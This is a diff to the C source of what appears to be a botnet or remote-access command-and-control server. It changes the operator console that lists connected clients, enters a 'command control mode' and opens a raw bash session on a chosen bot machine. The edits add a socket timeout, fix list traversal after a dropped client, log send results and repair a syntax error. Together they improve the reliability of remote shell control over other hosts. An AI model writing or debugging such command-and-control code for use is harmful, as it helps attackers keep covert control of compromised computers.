@@ -144,9 +144,14 @@ void *bot_command(void *arg)
 {
 
     char data[1024];
+    int rc = 0;
 
     connection *head = (connection *)arg;
     connection *tmp = (connection *)malloc(sizeof(connection));
+
+    struct timeval timeout;
+    timeout.tv_sec = 10;
+    timeout.tv_usec = 0;
 
     while (1)
     {
@@ -275,14 +280,13 @@ void *bot_command(void *arg)
                                 
                                 // Delete connection from list
                                 delete_connection(head, tmp);
-
+                                tmp = tmp->next;
                                 continue;
                             }
 
                             recieved_data[bytes_recv] = '\0';
                             printf("%s said: %s\n", tmp->hostname, recieved_data);
 
-                            //i++;
                             tmp = tmp->next;
                         }
                     }
@@ -315,7 +319,9 @@ void *bot_command(void *arg)
                     }
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
-                    send(tmp->pfds->fd, "bash", 5, 0);
+                    rc = send(tmp->pfds->fd, "bash", 5, 0);
+
+                    printf("rc: %d\n", rc);
 
                     // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
                     // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
@@ -331,7 +337,13 @@ void *bot_command(void *arg)
                         FD_SET(0, &raw_fds);
 
                         // Use select to find which fd is ready to go
-                        int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, NULL);
+                        int select_return = select(tmp->pfds->fd + 1, &raw_fds, NULL, NULL, &timeout);
+
+                        if (select_return == 0){
+                            printf("Timeout occured.\n");
+                            safe_exit = 1;
+                            break;
+                        }
 
                         if (select_return == -1)
                         {
@@ -451,7 +463,7 @@ void print_help_screen()
     printf("show             : Display list of connected clients\n");
     printf("help             : List of commands from console    \n");
     printf("exit             : Terminate the program            \n");
-    printf("command          : Enter command control mode       \n")
+    printf("command          : Enter command control mode       \n");
     printf("=====================================================\n\n");
     return;
 }
